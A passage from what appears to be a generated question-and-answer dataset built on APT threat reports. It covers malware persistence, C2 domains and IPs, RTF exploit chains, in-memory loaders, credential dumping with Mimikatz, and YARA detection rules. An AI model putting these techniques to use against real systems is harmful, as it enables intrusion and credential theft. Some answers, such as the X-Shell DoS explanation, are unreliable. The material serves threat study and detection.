Content]\nThe unique HTTP header \"Agtid:\" contains 8 characters followed by \"08x\". The same pattern can be seen in the POST content as well.\nA second related sample was also delivered from 111.118.21.105/css/sun.css on September 5, 2013. The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102.\nQuestion: In Operation DeputyDog, how did the malware achieve persistence on the infected system, and what specific techniques were used to disguise its callback traffic?",
    "output": "Answer: The malware achieved persistence by writing a DLL file named '28542CC0.dll' to the 'C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\' directory and adding a registry key under 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\28542CC0'. This registry key ensured that the malware would execute at startup using 'rundll32.exe' to run the DLL. To disguise its callback traffic, the malware connected to a host in South Korea (180.150.228.102) using HTTP over port 443, which is typically used for HTTPS encrypted traffic. However, the traffic was not actually HTTPS or SSL encrypted. The callback traffic resembled typical HTTP POST requests but included a unique HTTP header 'Agtid:' containing 8 characters followed by '08x'. This pattern was also present in the POST content, further obfuscating the nature of the communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What new malware families were introduced by APT34 in this phishing campaign, and how did these malware families differ in their functionalities and development methods?",
    "output": "APT34 introduced three new malware families in this phishing campaign: TONEDEAF, VALUEVAULT, and LONGWATCH. TONEDEAF is a backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, supporting system information collection, file upload/download, and arbitrary shell command execution. VALUEVAULT is a Golang compiled version of the 'Windows Vault Password Dumper' browser credential theft tool, which extracts and views credentials stored in the Windows Vault and matches browser passwords with visited sites. LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder. These malware families show APT34 relying on their PowerShell development capabilities as well as experimenting with Golang.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: The Fidelis Take\nThis paper highlights campaigns that has compromised systems at significant enterprises worldwide, utilizing various bot malware. We are publishing these indicators so others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated.\nGeneral Dynamics Fidelis' advanced threat defense product, Fidelis XPS\u2122, detects all of the activity documented in this paper. Further, we will continue to follow this specific activity and actively monitor the ever-evolving threat landscape for the latest threats to our customers' security.\nBig Headline: References\n1. Neutrino Bot (aka MS:Win32/Kasidet), June 2014: http://malware.dontneedcoffee.com/2014/06/neutrino-bot-aka-kasidet.html\n2. Renting a Zombie Farm: Botnets and the Hacker Economy, August 2014: http://www.symantec.com/connect/blogs/renting-zombie-farm-botnets-and-hacker-economy\n3. DorkBot, a Twin Botnet of NgrBot, August 2014: http://blog.fortinet.com/post/dorkbot-a-twin-botnet-of-ngrbot\n4. Big Box LatAm Hack (1st part - Betabot), January 2014: http://securelist.com/blog/research/58213/big-box-latam-hack-1st-part-betabot/\n5. A Good Look at the Andromeda Botnet, April 2014: https://blog.fortinet.com/post/a-good-look-at-the-andromeda-botnet\n6. CVE-2013-2729 and Andromeda 2.9 - A Massive HSBC themed email campaign, June 2014: http://stopmalvertising.com/spam-scams/cve-2013-2729-and-andromeda-2.9-a-massive-hsbc-themed-email-campaign/andromeda-botnet.html\n7. Beta Bot \u2013 A Code Review, November 2013: http://www.arbornetworks.com/asert/2013/11/beta-bot-a-code-review/\n8. Athena, A DDoS Malware Odyssey, Nov 2013: http://www.arbornetworks.com/asert/2013/11/athena-a-ddos-malware-odyssey/\n9. Andromeda Botnet Gets an Update, July 2013: http://blog.trendmicro.com/trendlabs-security-intelligence/andromeda-botnet-gets-an-update/\n10. New Commercial Trojan #INTH3WILD: Meet Beta Bot, May 2013: https://blogs.rsa.com/new-commercial-trojan-inth3wild-meet-beta-bot/\n11. A new bot on the market: Beta Bot, May 2013: https://blog.gdatasoftware.com/blog/article/a-new-bot-on-the-market-beta-bot.html\n12. Andromeda Botnet Resurfaces, March 2013: http://blog.trendmicro.com/trendlabs-security-intelligence/andromeda-botnet-resurfaces/\n13. Fooled by Andromeda, March 2013: http://www.0xebfe.net/blog/2013/03/30/fooled-by-andromeda/\n14. Botnets Die Hard - Owned and Operated \u2013 Defcon 20: July 2012: https://www.defcon.org/images/defcon-20/dc-20-presentations/Sood-Enbody/DEFCON-20-Sood-Enbody-Botnets-Die-Hard.PDF.pdf\n15. A Chat With NGR Bot, June 2012: http://resources.infosecinstitute.com/ngr-rootkit/\n16. Analysis of ngrBot, August 2011: http://stopmalvertising.com/rootkits/analysis-of-ngrbot.html\n\nQ: How does the Fidelis XPS\u2122 advanced threat defense product contribute to the detection and monitoring of bot malware activities, particularly those involving well-known bots like Neutrino Bot, DorkBot, and Andromeda Botnet?",
    "output": "A: The Fidelis XPS\u2122 advanced threat defense product plays a crucial role in detecting and monitoring bot malware activities. According to the report, it successfully identifies all the activities documented in the paper, which includes campaigns that have compromised systems at significant enterprises worldwide using various bot malware. This capability allows security professionals to monitor for this activity and potentially correlate it against other campaigns and tools under investigation. By continuously following this specific activity and actively monitoring the evolving threat landscape, Fidelis XPS\u2122 helps ensure the latest threats to customers' security are addressed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the X-Shell RAT used by the APT group enable Network Denial of Service (DoS) attacks, and what implications does this have for targeted resources?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users by exhausting the network bandwidth services rely on. In the case of the X-Shell RAT used by the APT group, it has the capability to conduct denial of service attacks, which can be leveraged to perform Network DoS attacks. Specifically, the RAT's ability to terminate TCP connections and shutdown or restart the computer can be used to flood a targeted resource with traffic, overwhelming its network bandwidth and rendering it unavailable to users. Furthermore, the RAT's optional feature to enable the compromised computer to be used as part of a botnet to conduct distributed denial of service attacks amplifies the potential impact of the attack. The fact that the X-Shell RAT is VM-aware, proxy-aware, and can use a specified DNS server to resolve callback domains also makes it more challenging to detect and mitigate such attacks. Overall, the X-Shell RAT's capabilities make it a potent tool for conducting Network DoS attacks, highlighting the importance of robust network defenses and mitigation strategies to protect against such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Outlook\nThis activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers, and seems to reveal a high operational tempo and wide collection requirements for APT41.\nIt is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.\nPreviously, (<https://www.fireeye.com/mandiant/managed-detection-and-response.html>)FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a (<https://content.fireeye.com/apt-41/rpt-apt41/>)unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.\nBig Headline: Appendix A: Discovery Rules\nThe following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all tradecraft-based discovery rules, we recommend deliberate testing and tuning prior to implementation in any production system. Some of these rules are\ntailored to build concise haystacks that are easy to review for high-fidelity detections. Some of these rules are broad in aperture that build larger haystacks for further automation or processing in threat hunting systems.\nimport \"pe\"\nrule ExportEngine_APT41_Loader_String\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\"\nstrings:\n$pcre = /loader_[\\x00-\\x7F]{1,}\\x00/\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\n}\nrule ExportEngine_ShortName\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This looks for Win PEs where Export DLL name is a single character\"\nstrings:\n$pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)\n+ 12))\n}\nrule ExportEngine_xArch\n{\nmeta:\nauthor = \"@stvemillertime\"         description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"\nstrings:\n$pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/             condition:              uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\n}\nrule RareEquities_LibTomCrypt\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed samples.\"\nstrings:\n$a1 = \"LibTomMath\"\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1\n}\nrule RareEquities_KCP\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP, https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"\nstrings:\n$a01 = \"[RO] %ld bytes\"\n$a02 = \"recv sn=%lu\"\n$a03 = \"[RI] %d bytes\"\n$a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\"\n$a05 = \"input psh: sn=%lu ts=%lu\"\n$a06 = \"input probe\"\n$a07 = \"input wins: %lu\"\n\nHow can the provided YARA rules help cybersecurity experts detect and mitigate APT41 activities, and what specific characteristics of APT41's tactics, techniques, and procedures (TTPs) do these rules target?",
    "output": "A: The provided YARA rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. These rules help cybersecurity experts by providing specific patterns to look for in potentially compromised systems. For example, the 'ExportEngine_APT41_Loader_String' rule looks for a common APT41 Export DLL name in BEACON shellcode loaders, while the 'RareEquities_LibTomCrypt' rule searches for executables with strings from LibTomCrypt, a cryptographic library used by some APT41-esque actors. These rules target specific characteristics such as DLL names, export table entries, and unique strings associated with libraries and transport protocols used by APT41, enabling experts to identify and respond to APT41 activities more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ECAT tool leverage the Recycler folder to uncover relevant artifacts left behind by APT adversaries?",
    "output": "The ECAT tool leverages the Recycler folder to uncover relevant artifacts by exploiting the tendencies of APT adversaries who often fail to clean up after themselves. Since certain directories do not typically contain certain types of files, ECAT queries these directories for files that are out of place. For example, the root of the Recycler folder should not contain any files at all. By requesting ECAT to download C:\\Recycler\\*.*, the analyst can retrieve files that were stored by the adversary, such as net.txt created in 2010, confirming initial suspicions of unauthorized activity dating back to that year.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nThe number of targeted attacks is undoubtedly on the rise. These highly targeted attacks focus on individual organizations in an effort to extract valuable information. In many ways, this is a return to the \"old hacking days\" before more widespread attacks targeting millions of users and the rise of computer worms came about. Sometimes, these targeted attacks are allegedly linked to state-sponsored activities but may also be carried out by individual groups with their own goals.\nTrend Micro continues to track and analyze highly targeted attacks, also known as \"advanced persistent threats (APTs).\" We have, in fact, published two research papers on the Luckycat1 and Lurid2 campaigns. This research paper will delve into another prominent group of attackers referred to as \"IXESHE\" (pronounced \"i-sushi\"), based on one of the more common detection names security companies use for the malware they utilize. This campaign is notable for targeting East Asian governments, electronics manufacturers, and a telecommunications company.\nThe IXESHE campaign makes use of targeted emails with malicious attachments to compromise victims' systems. The emails are often tailored for specific victims and contain malicious attachments that are almost always \"weaponized\" .PDF files with known exploits that drop malware executables onto targeted systems. In addition, the IXESHE attackers conducted two specific attacks that leveraged zero-day exploits\u2014one in 2009 and another in 2011.\n1\n2\nThe IXESHE attackers almost always make use of compromised servers as command-and-control (C&C) servers. In some cases, the compromised servers are hosted on target organizations' networks after successful infiltration so the attackers can increase their control of the victims' infrastructure. Using this approach, the attackers amassed at least 60 C&C servers over time. This technique also allows the attackers to cover their tracks, as having the C&C server in the victims' corporate networks means very little C&C traffic leaves them. The attackers' deliberate use of compromised machines and dynamic Domain Name System (DNS) services allows them to hide traces of their presence by confusing their activities with data belonging to legitimate individuals.\nLooking at threat intelligence derived from tracking APT campaigns over time primarily based on the network traffic generated by the malware used, we were able to develop indicators of compromise for the IXESHE campaign. The malware samples used in this campaign were not very complicated by nature but do give the attackers almost complete control over their targets' compromised systems.\n\nBased on the above text, answer a question. What strategy did the IXESHE attackers employ to establish command-and-control (C&C) servers, and how did this strategy benefit their operations?",
    "output": "The IXESHE attackers employed a strategy of using compromised servers as command-and-control (C&C) servers. In some cases, these compromised servers were hosted on the target organizations' networks after successful infiltration. This approach allowed the attackers to increase their control over the victims' infrastructure. By hosting C&C servers within the victims' corporate networks, the attackers minimized the amount of C&C traffic leaving the networks, making it harder for defenders to detect their activities. Additionally, the use of compromised machines and dynamic DNS services helped the attackers hide their presence by blending their activities with those of legitimate users, further complicating detection efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Attack vector\nThe attacks are initiated by email. Symantec.cloud has detected several emails distributing the VBS.Sojax back door Trojan. Two example emails are shown in figure 1.\nMost of the emails are fairly well tailored. The two examples shown here are probably the most targeted ones. Other emails topics are about salaries \u2013 a fairly common topic used in targeted attacks. The emails are nearly all sent from Gmail, which does not store the originating IP address. Two of the emails were\nFigure 1\nExample emails\nsent through Yahoo mail, which does store the originating IP address. The source IP address for both of these emails was the same \u2013 an IP address located in Germany. Other independent reports show this IP address as an originator of spam and thus may be an open relay.\nThe breakdown of emails detected by Syman-tec.cloud and samples per month is shown in figure 2. These numbers represent the minimum number of emails sent by the attackers as not all victims are using Symantec.cloud services.\nFigure 3 lists the number and type of exploit used by the attackers. The exploits are all old, publicly available, and patched. The vast majority used are PDF exploits. Sixteen samples exploiting the CVE-2010-2883 vulnerability have been located, with only one or two of the other exploits. It may be that the attackers have more success with the PDF exploit either because the target computers are not patched, or because it is easier to obfuscate the PDFs and prevent antivirus detection.\nMedium Headline: VBS.Sojax\nWhen the dropper document, the .doc, .rtf, or .pdf is loaded, it drops an executable to the following location:\n%ProgramFiles%\\Common Files\\Microsoft Shared\\update.exe\nThis executable is then run. When run, it extracts a script from its resources and writes this script to the following location %Temp%\\~temp.vbs. This script contains the primary functionality of the threat. Figure 4 shows a portion of the script. The simplicity of the script is plain to see.\nWhen first run, the script obtains the following information:\nSmall Headline: Samples & emails over time\nExploits used by the attackers\nA portion of VBS.Sojax\n\u2022 A complete listing of all files in partitions from drives C through I\n\u2022 Network information (ipconfig /all)\n\u2022 Information about the compromised computer (systeminfo)\n\u2022 Processes running on the computer (tasklist)\nIt stores all of the output in the following folder:\n%Windir%\\NtUninstallKB\nThis data is then compressed into a .cab file and uploaded to the C&C server. VBS.Sojax parses the response from the server, looking for three potential commands:\n\u2022 Upload files to the C&C server\n\u2022 Download files from the C&C server\n\u2022 Execute a command (figure 4)\nThe C&C server is then polled every 30 seconds for additional commands. To maintain persistence, VBS.Sojax registers itself to be called on reboot using a WMI event.\nMedium Headline: C&C server protocol\nWhen VBS.Sojax connects to the C&C server, it does so through HTTP port 80. If uploading data, it sends a HTTP POST request to a script called either count.php or loveusa.php. This POST request is formatted as follows:\nHTTP POST http://server.com/count/count.php?m=c&n=MACADDRESS\nThe MACADDRESS value is the MAC address of the compromised computer. To retrieve a command from the server, the script then polls for commands specific to that MACADDRESS.\nHTTP GET http://server.com/count/count.php?m=r&n=MACADDRESS.c\nIf there is a command, the command is executed and the results are uploaded to the server using a HTTP POST request. It is a very simple protocol, there is no authentication.\nSmall Headline: C&C servers\nSo far, 25 C&C servers have been identified. They are listed in Table 1 and graphed in figure 5. The majority of these C&C servers are free hosting providers. The attackers sign up for an account, register the sub-domain for free, and upload their C&C server script to a count folder. Table 1\nWhen a compromised computer uploads data to the count.php script using an HTTP post, that data is written into a file in the same folder as the C&C server. Although most of these files had since been retrieved and subsequently deleted by the attackers, several files remained. Some of the remaining files were the compressed .cab files described previously. Others were fragments of commands and some stolen files.\nIn one instance, several log files of activity on a C&C server were found. These log files listed all of the files stolen by the attackers with respect to that particular C&C server. There was also a log file showing what appeared to be FTP connections to the server from the attackers.\nCommand and  Control domains C&C Server Domains 2012enviroment.world.mu charlesbrain.shop.co clbest.greenglassint.net\ndasauto.no-sports.de\nfootballshopping.shop.co\nfrankwhales.shop.co\nFigure 5\nDistribution of C&C servers\njeepvihecle.shop.co\nkillmannets.0fees.net\nlampaur.b2b.cm\nlovesea-blog.co.de\nlucysmith.0fees.net\nmaritimemaster.kilu.org\nsawakastocks.tv4.org\nshoesshopping.shop.co\nshoppingfans.shop.co\nskirtdressing.shop.co\ntoms.0fees.net\ntomsburs.shop.co\nvpoasport.shopping2000.com\nwomems.in.nf\nwww.fireequipment.website.org\nwww.goodwell.all.co.uk www.lo[REMOVED]et.com www.pumasports.website.org\nSmall Headline: Distribution of VBS.Sojax victims\nVictim industries were military research, defense, manufacturing, and maritime. The data stolen was quite varied. In some cases it appeared that documents with suggestive names were stolen, simply out of curiosity. For example, one stolen document that had a military themed title is actually publicly available from the publisher's website.\nOther stolen files were more serious. Two separate victims had documents pertaining to the same military technology. The attackers were clearly targeting that technology. The attackers also stole source code from one of those two victims that may have been related to the technology.\nMedium Headline: The attackers\nThe most useful information about the attackers is in one of the log files retrieved from a C&C server. This log file appears to record connections to an FTP server running on the C&C server. The attackers probably use FTP to easily retrieve stolen data uploaded to the C&C server.  45 unique IP addresses were identified in the log. Of these, all but two are from the same ISP, based in Sichuan province in China. The remaining two are from South Korea. Figure 7 shows a portion of that log.\nFigure 7\nConnections from the attacker\nThe user LUCKYCAT is the attacker who successfully logged into the server. The connections by LUCKYCAT are consecutive. Immediately after one connection is closed, a new one is opened by the attacker. A lack of overlap implies that a single person or program is making the connections and not multiple people from different computers.\nDespite this, the IP address used for the new connection changes regularly. In figure 7, during a period of approximately an hour and 15 minutes, four different IP addresses were used for six distinct connections. This is unusual because if the attacker is using DHCP, generally an IP address will remain allocated to a particular computer for a longer period of time.\nA possible explanation is that the IP addresses used are the point of egress of a VPN-like service.  The attackers may be using a service through which they can route their connections. The service periodically rotates connections amongst a pool of IP addresses in order to render the attacker anonymous or implicate China as the source of the attack. There are two potential reasons for the South Korean IP addresses. The first is that the IP addresses are part of the VPN service and were assigned to the attacker as the service rotated through the range of IP addresses available.  The second explanation is that the attacker may have forgotten to enable the VPN by mistake and connected directly to the C&C server.\nFigures 8 and 9 show the log at the time that the South Korean IP addresses logged into the FTP server.\nFigure 8\nFirst South Korean IP address\nSecond South Korean IP address\nIn both cases, connections from the Chinese and South Korean IP addresses are around the same time. Either the time overlaps as in figure 8, or the times are immediately consecutive as in figure 9. This suggests that the connecting person, or program, is the same in both cases.\nBig Headline: Conclusion\nThe attacks described are very simple. That, however, does not mean that they are not intelligently designed and ultimately, highly effective. Using a scripting language to develop the VBS.Sojax threat cuts down on development time. It means less effort needs to be invested in attempting to prevent detection by antivirus software. Similarly, using freely available hosting for C&C servers (theoretically) limits exposure. Old exploits are so well documented and freely available that minimal effort is required to modify them for use. Such basic tools, in combination with targeted social engineering, proved to be an efficient combination for the attacker. These attacks should not have succeeded on a properly secured network. Old exploits should have been patched and users should have received adequate security awareness training.\n\nBased on the above text, answer a question. What insights can be drawn from the log files found on one of the C&C servers regarding the attackers' behavior and methods?",
    "output": "The log files found on one of the C&C servers revealed that the attackers used FTP to retrieve stolen data. The log files listed all the files stolen by the attackers and showed FTP connections to the server. The attackers used 45 unique IP addresses, with all but two from the same ISP in Sichuan province, China, and the remaining two from South Korea. The connections were consecutive, suggesting a single person or program was making the connections. The frequent change in IP addresses suggests the use of a VPN-like service to render the attackers anonymous or implicate China as the source of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Template 1: CVE-2012-0158 + CVE-2014-1761 Combo\nRecently we saw a lot of samples that exploit both CVE-2012-0158 and CVE-2014-1761, and usually either download or drop a Zbot variant.\nThe document starts with the RTF header stuff, followed by the encrypted second stage.\nThis is followed by the embedded object exploiting the CVE-2012-0158 vulnerability with the shellcode. Following it is a block exploiting the CVE-2014-1761 with a shellcode of its own, as illustrated in the image below.\nThe color scheme I will use in the rest of the document is the following: green represents the properly used components; yellow the unused components; and red the incorrectly used components.\nRegardless of the particular exploit used, both shellcodes performed the memory egg-hunting for the memory markers of the second stage (as described in2), and decrypted it when found. The second stage could be either a downloader shellcode or a Win32 executable.\nOne of these samples was SHA1: c3a7cb43ec13299b758cb8ca25eace71329939f7, which contained an encrypted Zbot variant3 at the beginning of the RTF. It looks very likely that this sample was used as a development template for the other malware writing groups.\nMedium Headline: First attempt: Plugx\nThe first attempt must have come from the group deploying Plugx. They took the above mentioned sample, and made some modifications to it.\nI can only guess that they didn't understand the CVE-2014-1761 component, and thought that there was only one shellcode, in the CVE-2012-0158 segment. So they appended the encrypted Plugx executable, and replaced the first shellcode with their own. This shellcode contains the hardcoded offset of the embedded executable, and decrypts from there.\nHowever, they left intact the encrypted Zbot executable at the beginning of the file and the second vulnerability, making this sample a real dual weapon: not only that it exploits two vulnerabilities, but contains two totally different payloads. However, Word can only be exploited once: during the exploitation procedure the current instance of Word exits, and a new one is started that displays the decoy document. So this creates a race condition: whichever vulnerability is triggered first (or gets lucky in an environment where the other one is patched) will have the chance to run its own payload.\n\nQuestion: How did the Plugx group modify the initial sample containing the CVE-2012-0158 and CVE-2014-1761 combo? What were the consequences of their modifications, and why did this create a dual weapon scenario?\n\nAnswer:",
    "output": "The Plugx group modified the initial sample by replacing the first shellcode in the CVE-2012-0158 segment with their own shellcode, which contained the hardcoded offset of the embedded Plugx executable. They also appended the encrypted Plugx executable to the document. However, they left intact the encrypted Zbot executable at the beginning of the file and the second vulnerability (CVE-2014-1761). The consequences of their modifications were that the sample became a dual weapon, containing two different payloads: Zbot and Plugx. This created a scenario where whichever vulnerability was triggered first (or was not patched) would have the chance to run its respective payload, leading to unpredictable behavior depending on the target environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Launcher DLL\nThe Internal name of this DLL is a randomly looking CLSID and it only exports one function called DllEntry.\nFigure 39. DLL name and export\nUpon execution, the launcher will attempt to hook legitimate wininet.dll library by overwriting its entry point in memory with the address of a malicious routine. If successful, every time the system loads wininet.dll, the entry point of the subsequently dropped backdoor DLL will be executed before the original wininet entry point.\nFigure 41. Backdoor decryption routine\nThere is no proper DLL injection routine \u2013 the payload is just decompressed to the memory as-is \u2013 so the malware needs to fix all the pointers in the decompressed code, which is done on a one-by-one basis using hardcoded values and offsets. This part takes 90% of the whole launcher code and includes over 11,000 modifications:\nFigure 42. A fragment of code used for fixing pointers\nThe launcher then calls the backdoor DLL's entry point:\nFigure 43. Call to the backdoor entry point\nThe routine that reads configuration from resources and decompresses the C2 communication library is then called by temporarily replacing the pointer to CComCriticalSection function with the pointer to that routine. Such an obfuscation method makes it difficult to spot it in the code:\nFigure 44. Obfuscated call to resources decryption routine\nThe launcher loads configuration from resources and uses an export from the backdoor DLL to initialize config values in memory.\nResource P1/1 contains config values, including port number and a registry path:\nFigure 45. Embedded configuration\nResource P1/2 contains list of C2 URLs:\nFigure 46. Hardcoded C2 URLs\nResource P1/ 0xC8 contains an additional compressed DLL used for C2 communication (HTTPProv):\nFigure 47. Compressed C2 communication library\nConfiguration values from the resources are then passed as parameter to one of the backdoor's functions in the following manner:\nFigure 48. Initialization of config values\nAfter the content of resource 0xC8 is decompressed, another function from the backdoor DLL is used to load the C2 communication module to the memory and call its \"CreateInstance\" export:\nFigure 49. Decompression of second DLL\nFinally, the launcher passes control to the main backdoor routine:\nFigure 50. Call to the main backdoor routine\nMedium Headline: Backdoor DLL\nThe backdoor DLL is stored in the .rdata section of the launcher, compressed with LZMA, and encrypted with RC4. The binary is heavily obfuscated with overlapping blocks of garbage code enclosed in pushf/popf instructions. The DllMain function replaces the pointer to GetModuleHandleA API with a pointer to hook routine that will return the base of the backdoor DLL when called with NULL as parameter (instead of returing the handle to the launcher DLL):\nFigure 51. Overwriting GetModuleHandleA pointer\nFigure 52. GetModuleHandleA hook\nThe backdoor also contains an export that loads the C2 communication module reflectively to the memory from resource passed as parameter and then calls its \"CreateInstance\" export.\nWhile we are still in the process of analyzing this backdoor's full functionality, it seems to be similar to the Remy backdoor described in our previous whitepaper on OceanLotus malware.\n\nAnswer this question based on the above context: How does the OceanLotus APT group's launcher DLL manage to execute its payload without a proper DLL injection routine? Explain the process and its significance.",
    "output": "The OceanLotus APT group's launcher DLL manages to execute its payload without a proper DLL injection routine by decompressing the payload directly into memory. This process involves several steps: first, the payload is decompressed into memory as-is. Then, the malware fixes all the pointers in the decompressed code on a one-by-one basis using hardcoded values and offsets. This part of the process is extensive, taking up approximately 90% of the entire launcher code and involving over 11,000 modifications. The significance of this approach is that it allows the malware to execute its payload without relying on traditional DLL injection techniques, making it harder to detect and analyze.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT29 group use data obfuscation techniques in their HAMMERTOSS malware to evade detection?",
    "output": "Data obfuscation is a technique used by adversaries to hide command and control traffic, making it more difficult to detect. In the case of APT29's HAMMERTOSS malware, the group uses various data obfuscation techniques to conceal their malicious activities. One such technique is the use of steganography, where the malware downloads an image from a specified URL, which appears normal but contains appended and encrypted data. The encrypted data is hidden at an offset specified in a tweet, and the malware uses a key comprised of hard-coded data from the malware binary appended with characters from the tweet to decrypt the data. This makes it challenging for network defenders to identify the malicious payload, even if they are able to predict or identify the target payloads. Additionally, APT29 uses legitimate web services, such as Twitter, to communicate with the malware, making it harder to discern between malicious and legitimate traffic. The group also employs an algorithm to generate daily Twitter handles, which are used to post obfuscated instructions, further complicating the detection process. Overall, APT29's use of data obfuscation techniques in HAMMERTOSS demonstrates their ability to adapt and evade detection, making them a formidable threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the reuse of email addresses and infrastructure between different campaigns, such as Mirage and Elderwood, suggest potential connections between these operations, and what implications does this have for cybersecurity investigations?",
    "output": "The reuse of email addresses (e.g., jeno_1980@hotmail.com & king_public@hotmail.com) and infrastructure (such as Dynamic DNS services operated by 3322.org) between different campaigns suggests potential connections between these operations. This reuse indicates that the same actors or closely affiliated groups may be involved in multiple campaigns. For cybersecurity investigations, this implies that tracking and analyzing reused elements can help identify patterns and link seemingly disparate attacks, providing valuable intelligence for attribution and defense strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Stonefly APT group use OS Credential Dumping: LSASS Memory in their attacks against high-value targets?",
    "output": "OS Credential Dumping: LSASS Memory is a technique used by adversaries to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). This technique can be used to harvest credential materials and conduct lateral movement using alternate authentication material. In the case of the Stonefly APT group, they have been observed using a credential-dumping tool called Mimikatz, which is capable of dumping LSASS process memory. Specifically, in one of their attacks, they used a masqueraded version of Mimikatz (file name: pl.exe) to dump credentials from the infected machine. This suggests that Stonefly is using OS Credential Dumping: LSASS Memory as part of their attack chain to gain access to sensitive credentials and move laterally within the target network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: by Nicholas Griffin and Roland Dela Paz\nIn October 2016 Forcepoint Security Labs\u2122 discovered new versions of the MM Core backdoor being used in targeted attacks. Also known as \"BaneChant\", MM Core is a file-less APT which is executed in memory by a downloader component. It was first reported in 2013 under the version number \"2.0-LNK\" where it used the tag \"BaneChant\" in its command-and-control (C2) network request. A second version \"2.1-LNK\" with the network tag \"StrangeLove\" was discovered shortly after.\nIn this blog we will detail our discovery of the next two versions of MM Core, namely \"BigBoss\" (2.2-LNK) and \"SillyGoose\" (2.3-LNK). Attacks using \"BigBoss\" appear likely to have occurred since mid-2015, whereas \"SillyGoose\" appears to have been distributed since September 2016. Both versions still appear to be active.\nRead the text above and answer this question: How does the evolution of the MM Core backdoor, particularly the 'BigBoss' and 'SillyGoose' versions, demonstrate the importance of continuous monitoring and adaptation in defending against Advanced Persistent Threats (APTs)?",
    "output": "The evolution of the MM Core backdoor, with the discovery of the 'BigBoss' (2.2-LNK) and 'SillyGoose' (2.3-LNK) versions, highlights the ongoing development and sophistication of APTs. 'BigBoss' has been active since mid-2015, while 'SillyGoose' started distribution in September 2016, indicating that attackers continually update their tools to evade detection and maintain persistence. This underscores the necessity for cybersecurity experts to implement continuous monitoring strategies and adapt their defenses regularly. By staying vigilant and updating security measures, organizations can better detect and respond to new variants of malware, ensuring they are prepared to handle evolving threats effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Geumseong12 group's use of spearphishing links relate to their overall attack tactics, and what techniques do they employ to evade detection?",
